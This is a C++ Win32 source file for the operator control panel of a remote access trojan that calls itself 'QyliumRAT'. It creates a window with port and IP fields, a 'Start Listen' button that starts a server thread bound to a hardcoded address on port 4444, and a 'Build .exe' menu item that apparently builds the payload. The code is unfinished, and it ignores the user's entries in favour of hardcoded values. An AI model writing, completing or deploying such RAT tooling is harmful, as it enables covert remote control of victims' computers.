// window.cpp
// main file that will makes GUI window

#pragma comment(linker,"\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

#include "server.h"
#include "includes.h"
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
TCHAR WinName[] = _T("MainFrame");
int APIENTRY _tWinMain(HINSTANCE This,
	HINSTANCE Prev,
	LPTSTR cmd,
	int mode)
{
	HWND hWnd;
	MSG msg;
	WNDCLASS wc;
	wc.hInstance = This;
	wc.lpszClassName = WinName;
	wc.lpfnWndProc = WndProc;
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.lpszMenuName = NULL;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	if (!RegisterClass(&wc)) return 0;

	hWnd = CreateWindow(WinName,
		"QyliumRAT",
		WS_OVERLAPPEDWINDOW | WS_VISIBLE,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		1280,
		720,
		HWND_DESKTOP,
		NULL,
		This,
		NULL);
	ShowWindow(hWnd, mode);

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
	WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
        // FreeConsole();
        MainWndMenus(hWnd);
        MainWndWidgets(hWnd);
		break;

	case WM_COMMAND:
		switch (wParam)
		{
        case OnMenuExitClicked:
            PostQuitMessage(0);
            break;
		
        case OnMenuAboutClicked:
            MessageBox(hWnd, "бимжи драйв мод для димона", "MorphBoxRepack", MB_ICONEXCLAMATION | MB_OK);
            break;
		case OnButtonListenClicked:
			start_listen(hWnd, PortWnd, IpWnd);
			break;
        }
		break;
	case WM_DESTROY: PostQuitMessage(0);
		break;

	default: return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

void MainWndMenus(HWND hWnd) // Add menu into window 
{
    HMENU RootMenu = CreateMenu();
    HMENU SubMenu = CreateMenu();

    AppendMenu(SubMenu, MF_STRING, OnMenuBuildClicked, "Build .exe");
    AppendMenu(SubMenu, MF_STRING, OnMenuAboutClicked, "About");
    AppendMenu(SubMenu, MF_STRING, OnMenuExitClicked, "Exit");

    AppendMenu(RootMenu, MF_POPUP, (UINT_PTR)SubMenu, "File");

    SetMenu(hWnd, RootMenu);
}

void MainWndWidgets(HWND hWnd)
{
    CreateWindow("static", "Port:", // text port
		WS_VISIBLE | WS_CHILD, 
		10, 10, 
		PortStaticWidth, PortStaticHeight, 
		hWnd, NULL, NULL, NULL);
    CreateWindow("static", "IP:", // text ip
		WS_VISIBLE | WS_CHILD, 
		10, PortStaticHeight*2+10, 
		IPStaticWidth, PortStaticHeight, 
		hWnd, NULL, NULL, NULL);
	// StatusLabel = CreateWindow("static", "", // text status
	// 	WS_VISIBLE | WS_CHILD, 
	// 	10, PortStaticHeight*2+10, 
	// 	IPStaticWidth, PortStaticHeight, 
	// 	hWnd, NULL, NULL, NULL);
    
    PortWnd = CreateWindow("edit", "4444", // text field for port
		WS_VISIBLE | WS_CHILD | WS_BORDER | ES_NUMBER, 
		PortStaticWidth+20, 10, 
		37, PortStaticHeight, 
		hWnd, (HMENU)200, NULL, NULL);
    IpWnd = CreateWindow("edit", DEFAULT_IP, // text field for ip
		WS_VISIBLE | WS_CHILD | WS_BORDER, 
		IPStaticWidth*2, PortStaticHeight*2+10, 
		110, PortStaticHeight, 
		hWnd, (HMENU)IPIndex, NULL, NULL);
    
    ListenBtn = CreateWindow("button", "Start Listen", // button listen
		WS_VISIBLE | WS_CHILD | ES_CENTER, 
		IPStaticWidth*10, 10, 
		100, PortStaticHeight*2+20, 
		hWnd, (HMENU)OnButtonListenClicked, NULL, NULL);
}

int get_port(HWND hWnd)
{
	// get port from edit box
	short port = GetDlgItemInt(hWnd, PortIndex, FALSE, FALSE);

	return port;
}

PSTR get_ip() 
{
	// get length of edit box
	int cTxtLen = GetWindowTextLength(IpWnd);
	PSTR pszMem = (PSTR)VirtualAlloc((LPVOID)NULL, (DWORD)(cTxtLen + 1), MEM_COMMIT, PAGE_READWRITE);

	// get ip from edit box
	GetWindowText(IpWnd, pszMem, cTxtLen + 1);

	return pszMem;
}

void start_listen(HWND hWnd, HWND portWnd, HWND ipWnd) // rewrite this using GetDlgItemInt
{
	// change button label
	if (!isListening) {
		SetWindowText(ListenBtn, "Stop Listen");

		PSTR ip = get_ip();
		short port = get_port(hWnd);

		Server server;
		// server.start_thread(port, ip);
		server.start_thread(4444, "192.168.31.135");
		
		// server.get_target_name();

		isListening = true;
	} else {
		SetWindowText(ListenBtn, "Start Listen");
		isListening = false;
	}
}